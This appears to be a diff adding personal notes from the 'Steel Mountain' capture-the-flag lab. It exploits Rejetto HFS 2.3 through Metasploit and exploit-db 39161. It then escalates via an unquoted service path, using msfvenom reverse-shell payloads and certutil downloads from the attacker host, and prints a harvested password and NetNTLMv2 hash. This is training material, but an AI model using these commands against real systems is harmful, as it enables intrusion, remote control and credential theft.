@@ -1,0 +1,203 @@
+Rejetto HTTP File Server (HFS) via Metasploit + PowerUp.ps1
+
+powershell -c command could we run to manually find out the service name
+    powershell -c Get-Service
+
+1-Enunmeration:
+    PORT      STATE SERVICE            REASON  VERSION
+    80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
+    |_http-server-header: Microsoft-IIS/8.5
+    |_http-title: Site doesn't have a title (text/html).
+    | http-methods: 
+    |   Supported Methods: OPTIONS TRACE GET HEAD POST
+    |_  Potentially risky methods: TRACE
+    135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
+    139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
+    445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+    3389/tcp  open  ssl/ms-wbt-server? syn-ack
+    | ssl-cert: Subject: commonName=steelmountain
+    | Issuer: commonName=steelmountain
+    | Public Key type: rsa
+    | Public Key bits: 2048
+    | Signature Algorithm: sha1WithRSAEncryption
+    | Not valid before: 2024-01-27T23:56:10
+    | Not valid after:  2024-07-28T23:56:10
+    | MD5:   071c:6bcb:5378:104c:7ccd:6199:fe97:8261
+    | SHA-1: cbc6:dd6b:46b5:7767:5c31:03f4:66fc:9ed1:842a:9ca8
+    | 
+    | rdp-ntlm-info: 
+    |   Target_Name: STEELMOUNTAIN
+    |   NetBIOS_Domain_Name: STEELMOUNTAIN
+    |   NetBIOS_Computer_Name: STEELMOUNTAIN
+    |   DNS_Domain_Name: steelmountain
+    |   DNS_Computer_Name: steelmountain
+    |   Product_Version: 6.3.9600
+    |_  System_Time: 2024-01-29T00:00:41+00:00
+    |_ssl-date: 2024-01-29T00:00:46+00:00; -1s from scanner time.
+    8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
+    |_http-server-header: HFS 2.3
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST
+    |_http-title: HFS /
+    |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+   
+    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+    Host script results:
+    | nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:5a:c9:51:34:31 (unknown)
+    | Names:
+    |   STEELMOUNTAIN<00>    Flags: <unique><active>
+    |   WORKGROUP<00>        Flags: <group><active>
+    |   STEELMOUNTAIN<20>    Flags: <unique><active>
+    | smb-security-mode: 
+    |   account_used: guest
+    |   authentication_level: user
+    |   challenge_response: supported
+    |_  message_signing: disabled (dangerous, but default)
+    | smb2-time: 
+    |   date: 2024-01-29T00:00:41
+    |_  start_date: 2024-01-28T23:55:58
+    |_clock-skew: mean: 0s, deviation: 0s, median: -1s
+    | smb2-security-mode: 
+    |   3:0:2: 
+    |_    Message signing enabled but not required
+
+
+2-Exploit Rejetto HTTP File Server (HFS) 2.3 port 8080 via Metasploit + PowerUp.ps1:
+    exploit(windows/http/rejetto_hfs_exec):
+        set rhost
+            rport
+            lhost
+            lport
+
+        run and get metrpreter shell
+
+    meterpreter > upload PowerUp.ps1
+
+                shell
+
+                C:\Users\bill\Desktop>powershell -ep bypass ..\PowerUp.ps1
+
+                    Look for "Unquoted service path"
+
+                sc query AdvancedSystemCareService9
+
+                sc stop AdvancedSystemCareService9
+
+                sc query AdvancedSystemCareService9: stopped
+
+    We create a remote shell + Priv escal and replace the binary of AdvancedSystemCareService9 that we have stopped 
+
+    msf6 > use multi/handler
+    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+    msf6 exploit(multi/handler) > set lhost 10.6.1.162
+        lhost => 10.6.1.162
+    msf6 exploit(multi/handler) > set lport 4443
+        lport => 4443
+    
+    msf6 exploit(multi/handler) > run
+
+
+
+    ┌──(kali㉿kali)-[~/Desktop/Windows_PrivEsc/Steel_Mountain_THM]
+    └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.6.1.162 LPORT=4443 -f exe > ASCService.exe
+
+    
+
+    meterpreter > cd c:\\
+    meterpreter > cd "program files (x86)"
+    meterpreter > cd IObit
+    meterpreter > cd "Advanced SystemCare"
+    meterpreter > upload ASCService.exe
+                  shell 
+
+    c:\program files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
+
+    we have root shell:
+        C:\Users\Administrators\Documents
+
+
+2-Exploit Rejetto HTTP File Server (HFS) 2.3 port 8080 Manual:
+
+    for the remote shell we will use this CVE:
+        https://www.exploit-db.com/exploits/39161
+
+    We upload and edit the code 
+
+    We add nc.exe in the path "Desktop/Windows_PrivEsc/Steel_Mountain_THM]"
+    python3 -m http.server 80
+    nc -lvnp <same Port as the exploit code>
+
+    We run the code
+    ┌──(kali㉿kali)-[~/Desktop/Windows_PrivEsc/Steel_Mountain_THM]
+    └─$ python2 39161.py 10.10.37.174 8080
+
+    IF needed we try a cupple of times:
+
+        we get a remote shell
+
+    We will try to upload the PrivescCheck.ps1 (for escalation priv):
+        certutil -urlcache -f http://<KALI IP>/PrivescCheck.ps1 PrivescCheck.ps1
+
+
+        powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"
+
+    If Powershell script doesn't work go to WinPease:
+
+        certutil -urlcache -f http://<KALI IP>/winPEASx64.exe winpeas.exe
+
+        winpeas.exe 
+
+            Ever logged users
+            STEELMOUNTAIN\Administrator
+            STEELMOUNTAIN\bill
+
+
+            hecking Credential manager
+            https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
+            [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
+            Username:              STEELMOUNTAIN\bill
+            Password:               PMBAf5KhZAxVhvqb
+            Target:                STEELMOUNTAIN\bill
+            PersistenceType:       Enterprise
+            LastWriteTime:         9/27/2019 5:22:42 AM
+
+
+
+            Enumerating Security Packages Credentials
+            Version: NetNTLMv2
+            Hash:    bill::STEELMOUNTAIN:1122334455667788:e213d1b8cd6d241ff8e550caed8673bd:0101000000000000b9a9993d5c52da01fcd98e70bc6b3163000000000800300030000000000000000000000000200000675bd1d5276ba469526337ffaeaa345e48dc89e61b74191e1c4edbf92a7dc90d0a00100000000000000000000000000000000000090000000000000000000000
+
+            C:\Users\All Users\Amazon\SSM\Logs\amazon-ssm-agent.log
+
+
+            AdvancedSystemCareService9(Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Stopped - No quotes and Space detected
+                File Permissions: bill [WriteData/CreateFiles]
+                Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
+
+
+            LiveUpdateSvc(IObit - LiveUpdate)[C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe] - Auto - Running - No quotes and Space detected                                                                                                                               
+                File Permissions: bill [WriteData/CreateFiles]
+                Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\LiveUpdate (bill [WriteData/CreateFiles])
+
+
+    Windows:
+        cd C:\Program Files (x86)\IObit\Advanced SystemCare
+
+    Kali:
+        msfvenom -p windows/shell_reverse_tcp LHOST=<KALI IP> LPORT=8888 -f exe > escalate.exe
+        nc -lvnp 8888
+
+
+        certutil -urlcache -f http://<KALI IP>/escalate.exe escalate.exe
+
+
+        sc query AdvancedSystemCareService9
+            sc query AdvancedSystemCareService9: stopped
+
+            sc stop AdvancedSystemCareService9
+
+            sc start AdvancedSystemCareService9
+
+    What powershell -c command could we run to manually find out the service name? 
+        powershell -c Get-Service
